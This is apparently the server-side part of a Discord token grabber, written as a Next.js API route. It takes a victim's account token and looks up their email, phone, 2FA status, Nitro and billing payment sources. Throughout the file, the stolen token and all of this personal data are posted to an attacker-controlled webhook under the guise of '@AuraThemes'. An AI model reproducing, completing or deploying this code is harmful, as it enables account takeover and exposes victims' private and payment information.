import { Emojis, Languages, UserProfile, BillingSource, Embed, ResponseData } from "@/interfaces";
import k4itrunConfig from '@k4itrunconfig';

import type { NextApiRequest, NextApiResponse } from 'next';
import axios from 'axios';

const obj: ResponseData = {
  success: false,
  message: "Bad Request: missing \"data\" query parameter",
  data: {
    timestamp: new Date().toISOString()
  }
};

export default async (
  request: NextApiRequest,
  response: NextApiResponse
): Promise<void> => {
  try {
    const { data: token } = request.query as { data?: string };

    if (!token) {
      response.send({ ...obj });
      return;
    }

    try {
      let user = await axios.get('https://discord.com/api/v9/users/@me', {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': token
        }
      });

      if (user.status !== 200) return;

      const CONFIG_HOOK = {
        avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
        username: '@AuraThemes',
        embeds: await embeds({ token, ...user.data })
      };

      await axios.post(k4itrunConfig.webhook, CONFIG_HOOK);
    } catch (error: any) {
      console.error(error)
    }

    response.send(token);
  } catch (error: any) {
    console.error(error)
  }
};

const emojis: Emojis = {
  themes: {
    dark: "Dark",
    light: "Light",
  },
  status: {
    online: "<:online:1129709364316491787>",
    idle: "<:idle:1120542710424674306>",
    dnd: "<:dnd:974692691289993216>",
    invisible: "<:offline:1137141023529762916>",
  },
  user: {
    boost: [
      "<:booster_1_month:1297275185099182170> ",
      "<:booster_2_month:1297275521868107886> ",
      "<:booster_3_month:1297275188030738533> ",
      "<:booster_6_month:1297275192724426915> ",
      "<:booster_9_month:1297275523139112990> ",
      "<:booster_12_month:1297275195400257597> ",
      "<:booster_15_month:1297275198277423245> ",
      "<:booster_18_month:1297275202442367067> ",
      "<:booster_24_month:1297275207400161311> ",
    ],
    i: [
      "<:staff:1297275182079017082> ",
      "<:partner:1297275180917330063> ",
      "<:hypesquad_events:1297275178300215386> ",
      "<:bughunter_1:1297275173296406568> ",
      "<:bravery:1297275208658456586> ",
      "<:brilliance:1297275519980671068> ",
      "<:balance:1297275520936837254> ",
      "<:early_supporter:1297275177163559064> ",
      "<:bughunter_2:1297275174634393683> ",
      "<:active_developer:1042545590640324608> ",
      "<:verified_developer:1297275176127299625> ",
    ],
  },
};

const languages: Languages = {
  "zh-TW": "🇨🇳 Chinese-Taiwanese",
  "pr-BR": "🇵🇹 Portuguese",
  "sv-SE": "🇸🇪 Swedish",
  "zh-CN": "🇨🇳 Chinese-China",
  "en-GB": "🪟 English (UK)",
  "en-US": "🇺🇸 USA",
  "es-ES": "🇪🇸 Español",
  ro: "🇷🇴 Romanian",
  fi: "🇫🇮 Finnish",
  vi: "🇻🇳 Vietnamese",
  tr: "🇹🇷 Turkish",
  ru: "🇷🇺 Russian",
  uk: "🇺🇦 Ukrainian",
  hi: "🇮🇳 Indian",
  th: "🇹🇼 Taiwanese",
  hr: "🇭🇷 Croatian",
  it: "🇮🇹 Italianio",
  lt: "🇱🇹 Lithuanian",
  no: "🇳🇴 Norwegian",
  ja: "🇯🇵 Japanese",
  ko: "🇰🇷 Korean",
  fr: "🇫🇷 French",
  da: "🇩🇰 Dansk",
  de: "🇩🇪 Deutsch",
  pl: "🇵🇱 Polish",
  cs: "🇨🇿 Czech",
  el: "🇬🇷 Greek",
  bg: "🇧🇬 Bulgarian",
  hu: "🇳🇴🇭🇺 Hungarian",
};

async function _fetch(url: string, token: string): Promise<any> {
  try {
    const response = await axios.get(url, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: token
      },
    });

    if (response.status !== 200) return 'Invalid';

    return response.data;
  } catch (error) {
    return 'Invalid';
  }
}

function nitro(user: UserProfile): string {
  const { premium_type, premium_guild_since } = user;
  const nitro = '<:nitro:1297275179566895184>';

  switch (premium_type) {
    case 1:
      return nitro;
    case 2:
      if (!premium_guild_since) return nitro;
      let now: any = new Date();

      let months = [2, 3, 6, 9, 12, 15, 18, 24];
      let rem = 0;

      for (let i = 0; i < months.length; i++) {
        let d: any = months[i];
        if (Math.round((date(new Date(premium_guild_since), d) - now) / 86400000) > 0) {
          rem = i;
          break;
        }
      }

      return `${nitro} ${emojis.user.boost[rem]}`;
    default:
      return '`❓`';
  }
}

function billing(payment: BillingSource[]): string {
  const types: Record<number, string> = {
    1: '<:creditcart:741512388490035251>',
    3: '`Giropay`',
    16: '`Rabobank`',
    7: '`PaysafeCard`',
  };

  const pay = payment?.reduce?.((acc, e) => {
    if (e.email) acc += `<:paypal:861207258846330880> `;
    if (!e.invalid && types[e.type]) acc += types[e.type] + ' ';
    return acc;
  }, '');

  return pay || '`❓`';
}

function date(start: Date, next: number): number {
  return new Date(start).setMonth(start.getMonth() + next);
}

function language(type: string): string {
  return languages[type] || 'Unknown Language';
}

function status(type: string): string {
  return emojis.status[type] || 'Unknown Status';
}

function flags(badge: number | undefined): string {
  if (badge === undefined) return '`❓`';

  const emojisList = emojis.user.i;

  return (
    (1 & badge ? emojisList[0] || '' : '') +
    (2 & badge ? emojisList[1] || '' : '') +
    (4 & badge ? emojisList[2] || '' : '') +
    (8 & badge ? emojisList[3] || '' : '') +
    (64 & badge ? emojisList[4] || '' : '') +
    (128 & badge ? emojisList[5] || '' : '') +
    (256 & badge ? emojisList[6] || '' : '') +
    (512 & badge ? emojisList[7] || '' : '') +
    (16384 & badge ? emojisList[8] || '' : '') +
    (4194304 & badge ? emojisList[9] || '' : '') +
    (131072 & badge ? emojisList[10] || '' : '')
  ) || '`❓`';
}

async function embeds(user: UserProfile & { token: string }): Promise<Embed[]> {
  const profile = await _fetch(`https://discord.com/api/v9/users/${user.id}/profile`, user.token);
  const settings = await _fetch(`https://discord.com/api/v9/users/@me/settings`, user.token);
  const payment = await _fetch(`https://discord.com/api/v9/users/@me/billing/payment-sources`, user.token);

  if (profile === 'invalid') return [];

  const ext = user.avatar.startsWith('a_') ? 'gif' : 'png';
  const avatar = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${ext}`;

  return [
    {
      color: 12740607,
      title: `${user.username} | ${user.id}`,
      thumbnail: {
        url: avatar + '?size=512'
      },
      fields: [
        {
          name: `<:x:1194495538138185728> Token:`,
          value: '```' + user.token + '```',
          inline: false
        },
        { name: '\u200b', value: '\u200b', inline: false },
        {
          name: '<a:mail:1245038428891123815> Email:',
          value: '`' + (user.email || '❓') + '`',
          inline: true
        },
        {
          name: '<a:phone:1104204812867874936> Phone:',
          value: '`' + (user.phone || '❓') + (user.mfa_enabled ? ' (2FA)' : '') + '`',
          inline: true
        },
        { name: '\u200b', value: '\u200b', inline: false },
        {
          name: '<a:nitro:1122755911967068210> Nitro:',
          value: nitro(profile),
          inline: true
        },
        {
          name: '<:billing:1122678162288037929> Billing:',
          value: billing(payment),
          inline: true
        },
        { name: '\u200b', value: '\u200b', inline: false },
        {
          name: '<a:badges:1138323945284714516> Badges:',
          value: flags(user.public_flags),
          inline: true
        },
        {
          name: '🏳️ Langue:',
          value: language(settings.locale),
          inline: true
        },
        {
          name: '🌙 Status:',
          value: status(settings.status),
          inline: true
        },
      ]
    }
  ]
}
